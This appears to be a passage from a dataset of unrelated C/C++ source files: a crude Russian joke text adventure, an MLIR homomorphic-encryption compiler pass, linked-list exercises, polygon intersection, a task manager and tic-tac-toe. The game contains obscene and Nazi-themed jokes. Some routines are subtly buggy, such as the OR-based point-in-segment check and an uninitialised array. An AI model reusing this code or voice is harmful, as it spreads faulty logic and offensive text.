\u041f\u0418\u0417\u0414\u0423\\n\";\r\n        system(\"pause\");\r\n        cout << \"))))))\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0412\u044b \u0443\u043c\u0435\u0440\u043b\u0438 \u043d\u0430\u0441\u043c\u0435\u0440\u0442\u044c.\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0410\u0425\u0410\u0425\u0410\u0425\u0410\u0425 \u0417\u0414\u041e\u0420\u041e\u0412\u041e \u042f \u0412\u0410\u0421 \u041d\u0410\u0415\u0411\u0410\u041b, \u0414\u0410??? \u0410\u0425\u0410\u0425\u0410\u0425\u0410\u0425)))))))\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0431\u043b\u044f\u0442\u044c.....\\n\";\r\n        system(\"pause\");\r\n    }\r\n    else {\r\n        exit(0);\r\n    }\r\n}\r\nvoid func67() {\r\n    cout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043d\u0435\u043c\u043d\u043e\u0433\u043e \u043f\u0440\u0435\u0441\u0441 \u043a\u0430\u0447\u0430\u0442 \u0438 \u043e\u0442\u0436\u0443\u043c\u0430\u043d\u0438\u044f? (y/n)\\n\";\r\n    cin >> q67;\r\n    if (q67 == 'y') {\r\n        cout << \"\u0412\u044b \u043f\u043e\u0440\u0432\u0430\u043b\u0438 \u041c\u042b\u0429\u042c\u0446\u0443 \u043f\u0438\u043f\u0438\u0441\u044c\u043a\u0438\\n\";\r\n        cout << \"\u0412\u044b \u0443\u043c\u0435\u0440\u043b\u0438 \u043d\u0430\u0441\u043c\u0435\u0440\u0442\u044c.\\n\";\r\n        system(\"pause\");\r\n        exit(0);\r\n    }\r\n    else if (q67 == 'n') {\r\n        cout << \"\u0421\u043b\u0430\u0432\u0430 \u0420\u043e\u0441\u0441\u0441\u0441\u0438\u0438. + 14 \u043e\u043f\u044b\u0442\u0430, + 88 \u0413\u041a\u0411...\\n\";\r\n        lvl = lvl + 14;\r\n        money = money + 88;\r\n    }\r\n    else {\r\n        exit(0);\r\n    }\r\n}\r\nvoid func66() {\r\n    cout << \"\u0412\u044b \u0432\u0438\u0434\u0438\u0442\u0435 \u043c\u0438\u043b\u043e\u0433\u043e \u043a\u043e\u0442\u0451\u043d\u043a\u0430. \u041f\u043e\u0433\u043b\u0430\u0434\u0438\u0442\u044c? (y/n)\\n\";\r\n    int A3 = 0;\r\n    int B3 = 1;\r\n    int X3 = 0;\r\n    X3 = A3 + rand() % ((B3 + 1) - A3);\r\n    cin >> q66;\r\n\r\n    if (q66 == 'y' && X3 == 0) {\r\n        cout << \"\u0412\u0430\u043c \u043e\u0442\u0440\u0435\u0437\u0430\u043b\u0438 \u0437\u0430\u043b\u0443\u043f\u0443...\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u041b\u0430\u0434\u043d\u043e...\\n\";\r\n        system(\"pause\");\r\n    }\r\n    if (q66 == 'y' && X3 == 1) {\r\n        cout << \"\u0412\u0430\u0441 \u0442\u0435\u043b\u0435\u043f\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043b\u043e \u043d\u0430 \u0441\u0435\u043a\u0440\u0435\u0442\u043d\u0443\u044e \u0431\u0430\u0437\u0443 \u043d\u0430\u0446\u0438\u0441\u0442\u043e\u0432 \u0438\u0430 \u043f\u0440\u0438\u0448\u0438\u043b\u0438 13 \u0447\u043b\u0435\u043d\u043e\u0432.\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u041e\u043d\u0438 \u0432\u0441\u0442\u0430\u044e\u0442 \u043f\u0440\u0438 heil hitler...\\n\";\r\n        system(\"pause\");\r\n    }\r\n    else if (q66 == 'n' && X3 == 0) {\r\n        cout << \"\u0412\u0430\u043c \u043f\u043e\u0446\u0430\u0440\u0430\u043f\u0430\u043b\u0438 \u043f\u0435\u043d\u0438\u0441\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0412\u0430\u043c \u043f\u043e\u043d\u0440\u0430\u0432\u0438\u043b\u043e\u0441\u044c...\\n\";\r\n        system(\"pause\");\r\n    }\r\n    else if (q66 == 'n' && X3 == 0) {\r\n        cout << \"\u0412\u0430\u043c \u043f\u043e\u0446\u0430\u0440\u0430\u043f\u0430\u043b\u0438 \u043f\u0435\u043d\u0438\u0441\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0412\u044b \u0443\u043c\u0435\u0440\u043b\u0438 \u043e\u0442 \u0437\u0430\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u043a\u0440\u043e\u0432\u0438.\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0412\u0430\u0441 \u0432\u043e\u0441\u043a\u0440\u0435\u0441\u0438\u043b \u043f\u0440\u0438\u0437\u0440\u0430\u043a \u043a\u043e\u043c\u043c\u0443\u043d\u0438\u0437\u043c\u0430. \u0417\u0430\u0447\u0435\u043c? \u0425\u0443\u0439 \u0435\u0433\u043e \u0437\u043d\u0430\u0435\u0442...\\n\";\r\n\r\n    }\r\n    else {\r\n        exit(0);\r\n    }\r\n}\r\nvoid func65() {\r\n    cout << \"\u0411\u0438\u043d\u0430\u0443\u0430\u0440\u043d\u044b\u0439 BeGeMoTT \u043f\u0440\u043e\u0441\u0438\u0442 \u0434\u043e\u0441\u0442\u0430\u0442\u044c \u0435\u043c\u0443 glaza \u0438\u0437 \u0420\u0435\u0427\u043a\u0418 (\u041e\u043d\u0438 glaza). \u0414\u043e\u0441\u0442\u0430\u0442\u044c glaza? (y/n)\\n\";\r\n    cin >> q65;\r\n    if (q65 == 'y') {\r\n        cout << \"\u0412\u044b \u043ebre4en\u044b\\n\";\r\n        system(\"pause\");\r\n        exit(0);\r\n    }\r\n    else if (q65 == 'n') {\r\n        cout << \"\u0412\u044b \u043ebre4en\u044b\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0410\u0445\u0430\u0445\u0430\u0445\u0430\u0445 \u044f \u043f\u043e\u0448\u0443\u0442\u0438\u043b.\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u0421\u043c\u0435\u0448\u043d\u043e, \u0434\u0430???\\n\";\r\n        system(\"pause\");\r\n\r\n    }\r\n    else {\r\n        exit(0);\r\n    }\r\n}\r\nvoid func64() {\r\n    cout << \"\u0412\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u0440\u0430\u0442\u044c. \u0425\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u0441\u0440\u0430\u0442\u044c? (y/n)\\n\";\r\n    cin >> q64;\r\n    if (q64 == 'y') {\r\n        cout << \"\u0423 \u0432\u0430\u0441 \u0443\u043a\u0440\u0430\u043b\u0438 \u0433\u043e\u0432\u043d\u043e. \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u044d\u0442\u043e \u0431\u044b\u043b \u043f\u0440\u043e\u0434\u0430\u0432\u0435\u0446 \u0433\u043e\u0432\u043d\u0430...\\n\";\r\n        system(\"pause\");\r\n        cout << \"\u041f\u0440\u0435\u0434\u043c\u0435\u0442 \u043f\u043e\u0442\u0435\u0440\u044f\u043d: \u0433\u043e\u0432\u043d\u043e.\\n\";\r\n        system(\"pause\");\r\n    }\r\n    else if (q64 == 'n') {\r\n        cout << \"\u0412\u044b \u0443\u043c\u0435\u0440\u043b\u0438 \u043e\u0442 \u0440\u0430\u0437\u0440\u044b\u0432\u0430 \u043f\u0440\u044f\u043c\u043e\u0439 \u043a\u0438\u0448\u043a\u0438...\\n\";\r\n        system(\"pause\");\r\n        exit(0);\r\n    }\r\n    else {\r\n        exit(0);\r\n    }\r\n}\r\n\r\n\r\nvoid func63() {\r\n    cout",
    "\n#include \"hecate/Dialect/Earth/Analysis/CandidateAnalysis.h\"\n#include \"hecate/Dialect/Earth/IR/EarthOps.h\"\n#include \"hecate/Dialect/Earth/IR/HEParameterInterface.h\"\n#include \"hecate/Dialect/Earth/Transforms/Passes.h\"\n#include \"mlir/Dialect/Func/IR/FuncOps.h\"\n\n#include \"hecate/Dialect/Earth/Analysis/CandidateAnalysis.h\"\n/* #include \"hecate/Dialect/Earth/Analysis/ScaleManagementUnit.h\" */\n#include \"hecate/Dialect/Earth/Transforms/Common.h\"\n#include \"mlir/IR/BuiltinAttributes.h\"\n#include \"mlir/Pass/PassManager.h\"\n#include \"mlir/Transforms/Passes.h\"\n#include \"llvm/Support/Format.h\"\n#include <random>\n\nnamespace hecate {\nnamespace earth {\n#define GEN_PASS_DEF_DACAPOPLANNER\n#include \"hecate/Dialect/Earth/Transforms/Passes.h.inc\"\n} // namespace earth\n} // namespace hecate\n\nusing namespace mlir;\n\n/* #define DEBUG_TYPE \"dacapo\" */\n#define DEBUG_TYPE \"Debug\"\n\nnamespace {\n/// Pass to bufferize Arith ops.\nstruct DaCapoPlannerPass\n    : public hecate::earth::impl::DaCapoPlannerBase<DaCapoPlannerPass> {\n  DaCapoPlannerPass() {}\n  DaCapoPlannerPass(hecate::earth::DaCapoPlannerOptions ops) {\n    this->waterline = ops.waterline;\n    this->output_val = ops.output_val;\n  }\n\n  void runOnOperation() override {\n\n    auto func = getOperation();\n    mlir::OpBuilder builder(func);\n\n    auto &ca = getAnalysis<hecate::CandidateAnalysis>();\n\n    // to, bestplan{latency, cutted_edges, return_type}\n    DenseMap<int64_t,\n             std::tuple<double, SmallVector<int64_t, 4>, SmallVector<Type, 4>,\n                        mlir::func::FuncOp, SmallVector<bool, 2>>>\n        bestPlan;\n    DenseMap<int64_t, Type> bypassInputTypes;\n\n    SmallVector<mlir::Type, 4> inputTypes;\n    SmallVector<bool, 2> inputBypasses;\n    for (auto argval : func.getArguments()) {\n      auto tp = mlir::RankedTensorType::get(\n          llvm::SmallVector<int64_t, 1>{1},\n          builder.getType<hecate::earth::CipherType>(waterline, 0));\n      inputTypes.push_back(tp);\n      inputBypasses.push_back(true);\n    }\n    bestPlan[0] = {0.0, {}, inputTypes, {}, inputBypasses};\n\n    auto mod = mlir::ModuleOp::create(func.getLoc());\n\n    // pm : PassManager_BootstrappingPlanner\n    // pmC : PassManager_CoverageRecorder\n    PassManager pm(mod.getContext()), pmC(mod.getContext());\n    // add check partitioning, and separate passmanager,\n    pm.addNestedPass<func::FuncOp>(hecate::earth::createBootstrapPlacement());\n    pm.addNestedPass<func::FuncOp>(hecate::earth::createCodeSegmentation());\n    pm.addNestedPass<func::FuncOp>(\n        hecate::earth::createProactiveRescaling({waterline, output_val}));\n    pm.addNestedPass<func::FuncOp>(hecate::earth::createEarlyModswitch());\n    pm.addPass(mlir::createCanonicalizerPass());\n    pm.addPass(mlir::createCSEPass());\n    pm.addNestedPass<func::FuncOp>(hecate::earth::createLatencyEstimator());\n\n    pmC.addNestedPass<func::FuncOp>(hecate::earth::createBootstrapPlacement());\n    pmC.addNestedPass<func::FuncOp>(hecate::earth::createCodeSegmentation());\n    pmC.addNestedPass<func::FuncOp>(\n        hecate::earth::createCoverageRecorder({waterline, 0.5}));\n\n    int64_t setNum =\n        func->getAttrOfType<mlir::IntegerAttr>(\"selected_set\").getInt();\n    for (auto to : ca.getCandidates()) {\n      double optCost = std::numeric_limits<double>::max();\n      func::FuncOp optFunc;\n      LLVM_DEBUG(llvm::dbgs() << to << \" s btp_targets: \";\n                 for (auto bbbb\n                      : ca.getTargets(to, setNum)) llvm::dbgs()\n                 << bbbb << \" \";\n                 llvm::dbgs() << '\\n';);\n      for (auto from : ca.toFromMap[to]) {\n        auto vif = ca.getValueInfo(from);\n        auto dup = func.clone();\n        dup.setName((func.getName() + \"_\" + std::to_string(from) + \"_\" +\n                     std::to_string(to))\n                        .str());\n        dup->setAttr(\"cutted_edge\", builder.getDenseI64ArrayAttr({from, to}));\n        dup->setAttr(\"btp_target\",\n                     builder.getDenseI64ArrayAttr(ca.getTargets(from, setNum)));\n        dup->setAttr(\n            \"segment_input\",\n            builder.getDenseI64ArrayAttr(ca.getValueInfo(from)->getLiveOuts()));\n        dup->setAttr(\"segment_inputType\",\n                     builder.getTypeArrayAttr(std::get<2>(bestPlan[from])));\n        dup->setAttr(\"segment_return\", builder.getDenseI64ArrayAttr(\n                                           ca.getValueInfo(to)->getLiveOuts()));\n        dup->setAttr(\"is_mid_segment\", builder.getBoolAttr(true));\n\n        dup->setAttr(\"segment_bypassType\",\n                     builder.getBoolArrayAttr(std::get<4>(bestPlan[from])));\n        dup->setAttr(\"segment_returnBypasses\",\n                     builder.getBoolArrayAttr(ca.getBypassTypeOfLiveOuts(to)));\n        mod.push_back(dup);\n        if (pm.run(mod).failed()) {\n          llvm::dbgs() << \"pm Pass failed\" << '\\n';\n          dup.dump();\n          assert(0 && \"Pass failed inside DaCapo explorer\");\n        }\n\n        double cost = dup->getAttrOfType<mlir::FloatAttr>(\"est_latency\")\n            ",
    "#include <iostream>\nusing namespace std;\n\nstruct DNode {\n    int data;\n    DNode* next;\n    DNode* prev;\n    DNode(int data) : data(data), next(nullptr), prev(nullptr) {}\n};\n\nDNode* insert_at_beginning(DNode* head, int data) {\n    DNode* new_node = new DNode(data);\n    if (head) {\n        head->prev = new_node;\n    }\n    new_node->next = head;\n    return new_node;\n}\n\nDNode* insert_at_end(DNode* head, int data) {\n    DNode* new_node = new DNode(data);\n    if (!head) {\n        return new_node;\n    }\n    DNode* current = head;\n    while (current->next) {\n        current = current->next;\n    }\n    current->next = new_node;\n    new_node->prev = current;\n    return head;\n}\n\nDNode* delete_from_beginning(DNode* head) {\n    if (!head) {\n        return nullptr;\n    }\n    DNode* temp = head;\n    head = head->next;\n    if (head) {\n        head->prev = nullptr;\n    }\n    delete temp;\n    return head;\n}\n\nDNode* delete_from_end(DNode* head) {\n    if (!head || !head->next) {\n        delete head;\n        return nullptr;\n    }\n    DNode* current = head;\n    while (current->next) {\n        current = current->next;\n    }\n    if (current->prev) {\n        current->prev->next = nullptr;\n    }\n    delete current;\n    return head;\n}\n\nvoid print_list(DNode* head) {\n    DNode* current = head;\n    while (current) {\n        cout << current->data << \" \";\n        current = current->next;\n    }\n    cout << endl;\n}\n\nint main() {\n        DNode* d_head = nullptr;\n    \n    //\tInsertion\n    d_head = insert_at_beginning(d_head, 3);\n    d_head = insert_at_beginning(d_head, 2);\n    d_head = insert_at_beginning(d_head, 1);\n    d_head = insert_at_end(d_head, 7);\n    \n    //Display\n    print_list(d_head);\n    \n    //Deletion\n    d_head = delete_from_beginning(d_head);\n    print_list(d_head);\n    d_head = delete_from_end(d_head);\n    \n    print_list(d_head);\n\n    return 0;\n}\n",
    "#include \"PolygonIntersect.h\"\n#include <vector>\n\n// \u5411\u91cf\u53c9\u79ef\ndouble cross_product_z(const Point& a, const Point& b, const Point& c) {\n    return (b.x - a.x) * (c.y - a.y) - (b.y - a.y) * (c.x - a.x);\n}\n\n// \u5224\u65ad\u70b9\u662f\u5426\u5728\u7ebf\u6bb5\u5185\nbool point_in_segment(const Point& p, const Point& s1, const Point& s2) {\n    return (s1.x <= p.x && p.x <= s2.x) || (s2.x <= p.x && p.x <= s1.x) ||\n           (s1.y <= p.y && p.y <= s2.y) || (s2.y <= p.y && p.y <= s1.y);\n}\n\n// \u5224\u65ad\u70b9\u662f\u5426\u5728\u591a\u8fb9\u5f62\u5185\nbool point_in_polygon(const Point& p, const std::vector<Point>& polygon) {\n    int count = 0;\n    for (size_t i = 0; i < polygon.size(); ++i) {\n        const Point& prev = polygon[i == 0 ? polygon.size() - 1 : i - 1];\n        const Point& cur = polygon[i];\n        if ((cur.y > p.y) != (prev.y > p.y)) {\n            if (cross_product_z(prev, cur, p) > 0) {\n                ++count;\n            }\n        }\n    }\n    return count % 2 == 1;\n}\n\n// \u5224\u65ad\u4e24\u4e2a\u591a\u8fb9\u5f62\u662f\u5426\u76f8\u4ea4\nbool polygons_intersect(const std::vector<Point>& polygon1, const std::vector<Point>& polygon2) {\n    // \u68c0\u67e5\u8fb9\u662f\u5426\u76f8\u4ea4\n    for (size_t i = 0; i < polygon1.size(); ++i) {\n        const Point& p1 = polygon1[i];\n        const Point& q1 = polygon1[(i + 1) % polygon1.size()];\n        for (size_t j = 0; j < polygon2.size(); ++j) {\n            const Point& p2 = polygon2[j];\n            const Point& q2 = polygon2[(j + 1) % polygon2.size()];\n            if (cross_product_z(p1, q1, p2) * cross_product_z(p1, q1, q2) <= 0 &&\n                cross_product_z(p2, q2, p1) * cross_product_z(p2, q2, q1) <= 0) {\n                return true;\n            }\n        }\n    }\n\n    // \u68c0\u67e5\u9876\u70b9\u662f\u5426\u5728\u5bf9\u65b9\u591a\u8fb9\u5f62\u5185\n    for (const Point& p : polygon1) {\n        if (point_in_polygon(p, polygon2)) {\n            return true;\n        }\n    }\n    for (const Point& p : polygon2) {\n        if (point_in_polygon(p, polygon1)) {\n            return true;\n        }\n    }\n\n    return false;\n}",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\nstruct Student {\r\n    char usn[20];\r\n    char name[30];\r\n    float avg_marks;\r\n    struct Student* next;\r\n};\r\n\r\nstruct Student* createStudent() {\r\n    struct Student* newStudent = (struct Student*)malloc(sizeof(struct Student));\r\n\r\n    if (newStudent == NULL) {\r\n        printf(\"Memory allocation failed.\\n\");\r\n        exit(1);\r\n    }\r\n\r\n    printf(\"Enter USN: \");\r\n    scanf(\"%s\", newStudent->usn);\r\n    printf(\"Enter Name: \");\r\n    scanf(\"%s\", newStudent->name);\r\n    printf(\"Enter Average Marks: \");\r\n    scanf(\"%f\", &newStudent->avg_marks);\r\n\r\n    newStudent->next = NULL;\r\n    return newStudent;\r\n}\r\n\r\nvoid insertAtEnd(struct Student** head) {\r\n    struct Student* newStudent = createStudent();\r\n\r\n    if (*head == NULL) {\r\n        *head = newStudent;\r\n    } else {\r\n        struct Student* temp = *head;\r\n        while (temp->next != NULL) {\r\n            temp = temp->next;\r\n        }\r\n        temp->next = newStudent;\r\n    }\r\n\r\n    printf(\"Student data inserted at the end successfully.\\n\");\r\n}\r\n\r\nvoid insertAtFront(struct Student** head) {\r\n    struct Student* newStudent = createStudent();\r\n    newStudent->next = *head;\r\n    *head = newStudent;\r\n\r\n    printf(\"Student data inserted at the front successfully.\\n\");\r\n}\r\n\r\nvoid deleteAtFront(struct Student** head) {\r\n    if (*head == NULL) {\r\n        printf(\"Stack is empty. Unable to pop.\\n\");\r\n        return;\r\n    }\r\n\r\n    struct Student* temp = *head;\r\n    *head = (*head)->next;\r\n    free(temp);\r\n\r\n    printf(\"Student data deleted from the front successfully.\\n\");\r\n}\r\n\r\nvoid displayList(struct Student* head) {\r\n    printf(\"\\nStudent List:\\n\");\r\n    while (head != NULL) {\r\n        printf(\"USN: %s, Name: %s, Avg Marks: %.2f\\n\", head->usn, head->name, head->avg_marks);\r\n        head = head->next;\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid demonstrateStack(struct Student** head) {\r\n    printf(\"Demonstrating Stack using SLL:\\n\");\r\n    insertAtFront(head);\r\n    insertAtFront(head);\r\n    insertAtFront(head);\r\n    displayList(*head);\r\n    deleteAtFront(head);\r\n    displayList(*head);\r\n}\r\n\r\nvoid demonstrateQueue(struct Student** head) {\r\n    printf(\"Demonstrating Queue using SLL:\\n\");\r\n    insertAtEnd(head);\r\n    insertAtEnd(head);\r\n    insertAtEnd(head);\r\n    displayList(*head);\r\n    deleteAtFront(head);\r\n    displayList(*head);\r\n}\r\n\r\nint main() {\r\n    struct Student* head = NULL;\r\n    int choice;\r\n\r\n    do {\r\n        printf(\"\\nMenu:\\n\");\r\n        printf(\"1. Insert at the end\\n\");\r\n        printf(\"2. Insert at the front\\n\");\r\n        printf(\"3. Delete at the front (Stack pop)\\n\");\r\n        printf(\"4. Display status\\n\");\r\n        printf(\"5. Demonstrate Stack\\n\");\r\n        printf(\"6. Demonstrate Queue\\n\");\r\n        printf(\"7. Exit\\n\");\r\n        printf(\"Enter your choice: \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                insertAtEnd(&head);\r\n                break;\r\n            case 2:\r\n                insertAtFront(&head);\r\n                break;\r\n            case 3:\r\n                deleteAtFront(&head);\r\n                break;\r\n            case 4:\r\n                displayList(head);\r\n                break;\r\n            case 5:\r\n                demonstrateStack(&head);\r\n                break;\r\n            case 6:\r\n                demonstrateQueue(&head);\r\n                break;\r\n            case 7:\r\n                printf(\"Exiting the program.\\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice. Please enter a valid option.\\n\");\r\n        }\r\n\r\n    } while (choice != 7);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"TaskManager.h\"\n#include \"ColorManager.hpp\" // Include ColorManager.hpp for terminal colors\n#include <iostream>\n#include <iomanip> // for put_time\n#include <ctime>\n#include <future> // Add <future> header for std::async and std::launch\n\nusing std::async;\nusing std::future;\nusing std::launch;\nusing std::string;\n\n/**\n * @brief Constructor to initialize TaskManager with a reference to the Database.\n *\n * @param db Reference to the Database object.\n */\nTaskManager::TaskManager(Database &db) : database(db) {\n    auto futureTasks = database.getTasksAsync();\n    futureTasks.wait();\n    tasks = futureTasks.get();\n}\n\n/**\n * @brief Asynchronous addition of a new task with the given description.\n *\n * Adds a new task to the database asynchronously using the Database object and updates the internal tasks list.\n *\n * @param description Description of the task to be added.\n * @return Future object for the add task operation.\n */\nfuture<void> TaskManager::addTaskAsync(const string &description) {\n    return async(launch::async, [this, description]()\n                 {\n        try {\n            // Add task asynchronously\n            auto future = database.addTaskAsync(description);\n            future.wait(); // Wait for the asynchronous operation to complete\n            // Update tasks asynchronously after addition\n            auto futureTasks = database.getTasksAsync();\n            futureTasks.wait();\n            tasks = futureTasks.get();\n        }\n        catch (const std::exception &e) {\n            std::cerr << \"Error adding task asynchronously: \" << e.what() << std::endl;\n            throw; // Rethrow the exception to propagate it further\n        } });\n}\n\n/**\n * @brief Asynchronous listing of all tasks with their IDs, descriptions, status (done or not done), and timestamps.\n *\n * Lists all tasks from the internal tasks list asynchronously. Uses ColorManager to display colored output.\n * Prints the task ID, description, status (done or not done), creation time, and if done, completion time.\n * Created time is displayed in BLUE, completed time (if applicable) is displayed in GREEN.\n *\n * @return Future object for the list tasks operation.\n */\nfuture<void> TaskManager::listTasksAsync() const {\n    return async(launch::async, [this]()\n                 {\n        try {\n            auto futureTasks = database.getTasksAsync();\n            futureTasks.wait();\n            auto tasks = futureTasks.get();\n\n            for (const auto &task : tasks) {\n                // Using BLUE for task ID and description\n                std::cout << Color::BLUE() << task.getId() << \". \" << task.getDescription() << Color::RESET();\n\n                // Using GREEN for done tasks and YELLOW for not done tasks\n                if (task.isDone()) {\n                    std::cout << Color::GREEN() << \" [Done]\" << Color::RESET();\n                }\n                else {\n                    std::cout << Color::YELLOW() << \" [Not Done]\" << Color::RESET();\n                }\n\n                // Display creation time\n                std::time_t createdTime = task.getCreatedTime();\n                std::tm created_tm = *std::localtime(&createdTime);\n                std::cout << \" (Created: \" << Color::GREEN() << std::put_time(&created_tm, \"%Y-%m-%d %H:%M:%S\") << Color::RESET();\n\n                // Display completion time if task is done\n                if (task.isDone()) {\n                    std::time_t completedTime = task.getCompletedTime();\n                    std::tm completed_tm = *std::localtime(&completedTime);\n                    std::cout << Color::GREEN() << \" (Completed: \" << std::put_time(&completed_tm, \"%Y-%m-%d %H:%M:%S\") << \")\" << Color::RESET();\n                }\n        std::cout << '\\n';\n            }\n        }\n        catch (const std::exception &e) {\n            std::cerr << \"Error listing tasks asynchronously: \" << e.what() << std::endl;\n            throw; // Rethrow the exception to propagate it further\n        } });\n}\n\n/**\n * @brief Asynchronous marking of a task as done using its ID.\n *\n * Marks a task as done in the database asynchronously using the Database object and updates the internal tasks list.\n *\n * @param id ID of the task to be marked as done.\n * @return Future object for the mark task done operation.\n */\nfuture<void> TaskManager::markTaskDoneAsync(int id) {\n    return async(launch::async, [this, id]()\n                 {\n        try {\n            // Mark task as done asynchronously\n            auto future = database.markTaskDoneAsync(id);\n            future.wait(); // Wait for the asynchronous operation to complete\n            // Update tasks asynchronously after marking as done\n            auto futureTasks = database.getTasksAsync();\n            futureTasks.wait();\n            tasks = futureTasks.get();\n        }\n        catch (const std::exception &e) {\n            std::cerr << \"Error marking task as done asynchronously: \" << e.what() << std::endl;\n            throw; // Rethrow the exception to propagate it furth",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dars_9\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n \r\nstring PlayerInput(char Ttt[][3], string*, string*);\r\nstring Winner(char Ttt[][3], string, string);\r\nvoid Display(string*, string, string);\r\n \r\nint main()\r\n{\r\n    char Ttt[3][3]{\r\n       {'-', '-', '-'},\r\n       {'-', '-', '-'},\r\n       {'-', '-', '-'}\r\n    };\r\n    string Plyr1;\r\n    string Plyr2;\r\n \r\n    cout << \"\\t\\t\\t\\t     ***  TIC - TAC - TOE  ***\\n\\n\";\r\n    cout << \"\\t\\t\\t\\t        Welcome to our Game\\n\\n\";\r\n \r\n    // Player information\r\n \r\n    cout << \"Enter player 1 name : \";\r\n    getline(cin, Plyr1);\r\n    cout << \"Enter player 2 name : \";\r\n    getline(cin, Plyr2);\r\n \r\n    // Input Location format \r\n \r\n    cout << \"\\nChoose following format to enter input\\n\\n\";\r\n    cout << \" 1 | 2 | 3 \" << endl;\r\n    cout << \" 4 | 5 | 6 \" << endl;\r\n    cout << \" 7 | 8 | 9 \" << endl << endl;\r\n \r\n    // Input\r\n    string Winner = PlayerInput(Ttt, &Plyr1, &Plyr2);\r\n    // output\r\n    Display(&Winner, Plyr1, Plyr2);\r\n \r\n}string PlayerInput(char Ttt[][3], string* P1, string* P2)\r\n{\r\n \r\n    string p1;\r\n    string p2;\r\n    char ReptValu[10];\r\n   \r\n    string Win;\r\n \r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        // Player 1 Input\r\n        cout << *P1 << \" turn : \";\r\n        do\r\n        {\r\n            cin >> p1;\r\n             \r\n            if (p1.length() == 1 && p1[0] < 58 && p1[0] > 48 && p1[0] != ReptValu[0] && p1[0] != ReptValu[1]\r\n                && p1[0] != ReptValu[2] && p1[0] != ReptValu[3] && p1[0] != ReptValu[4] && p1[0] != ReptValu[5]\r\n                && p1[0] != ReptValu[6] && p1[0] != ReptValu[7] && p1[0] != ReptValu[8] && p1[0] != ReptValu[9])\r\n            {\r\n                cout << endl;\r\n                break;\r\n            }\r\n            else if (p1[0] == ReptValu[0] || p1[0] == ReptValu[1] || p1[0] == ReptValu[2] || p1[0] == ReptValu[3]\r\n                || p1[0] == ReptValu[4] || p1[0] == ReptValu[5] || p1[0] == ReptValu[6] || p1[0] == ReptValu[7]\r\n                || p1[0] == ReptValu[8] || p1[0] == ReptValu[9])\r\n            {\r\n                cout << \"\\n * *This position is occupied.Please choose an another position. * *\\n\\n\";\r\n                cout << *P1 << \" turn again : \";\r\n            }\r\n            else\r\n            {\r\n                cout << \"\\nInvalid input.\\nPlease enter a natural number from the range 1 to 9.\\n\\n\";\r\n                cout << *P1 << \" turn again : \";\r\n            }\r\n        } while (true);\r\n \r\n        // Storing Player 1 Input in Matrix\r\n \r\n        if (p1[0] == '1') { Ttt[0][0] = 'X'; }\r\n        if (p1[0] == '2') { Ttt[0][1] = 'X'; }\r\n        if (p1[0] == '3') { Ttt[0][2] = 'X'; }\r\n        if (p1[0] == '4') { Ttt[1][0] = 'X'; }\r\n        if (p1[0] == '5') { Ttt[1][1] = 'X'; }\r\n        if (p1[0] == '6') { Ttt[1][2] = 'X'; }\r\n        if (p1[0] == '7') { Ttt[2][0] = 'X'; }\r\n        if (p1[0] == '8') { Ttt[2][1] = 'X'; }\r\n        if (p1[0] == '9') { Ttt[2][2] = 'X'; }\r\n \r\n        // Checking winner if there is.\r\n        Win = Winner(Ttt, *P1, *P2);\r\n \r\n        // showing user input in matrix form \r\n        cout << \" \" << Ttt[0][0] << \" | \" << Ttt[0][1] << \" | \" << Ttt[0][2];\r\n        cout << \"\\t\\t 1 | 2 | 3 \" << endl;\r\n        cout << \" \" << Ttt[1][0] << \" | \" << Ttt[1][1] << \" | \" << Ttt[1][2] ;\r\n        cout << \"\\t\\t 4 | 5 | 6 \" << endl;\r\n        cout << \" \" << Ttt[2][0] << \" | \" << Ttt[2][1] << \" | \" << Ttt[2][2] ;\r\n        cout << \"\\t\\t 7 | 8 | 9 \" << endl << endl;\r\n \r\n        if (Win == *P1 || Win == *P2) break; // End the game if there's a winner\r\n        else if (i == 4) { Win = \"Draw\"; break; }// End the game if game is draw\r\n        ReptValu[i] = p1[0];\r\n        // Player 2 Input\r\n \r\n        cout << *P2 << \" turn : \";\r\n        